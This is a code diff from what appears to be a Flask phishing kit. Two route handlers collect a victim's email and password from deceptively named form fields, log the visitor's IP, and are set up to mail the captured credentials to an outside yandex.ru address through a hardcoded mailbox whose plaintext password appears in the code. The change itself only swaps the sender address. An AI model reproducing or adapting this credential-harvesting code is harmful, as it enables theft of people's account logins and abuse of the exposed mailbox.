@@ -176,7 +176,7 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'purchase@lexctrading.com'
+        sender_email = 'procurement@lexctrading.com'
         sender_emaill = 'adil'
         receiver_email = 'saintobitrans@yandex.ru'
         password = 'London@222$#'
@@ -217,7 +217,7 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'purchase@lexctrading.com'
+        sender_email = 'procurement@lexctrading.com'
         sender_emaill = 'adil'
         receiver_email = 'saintobitrans@yandex.ru'
         password = 'London@222$#'
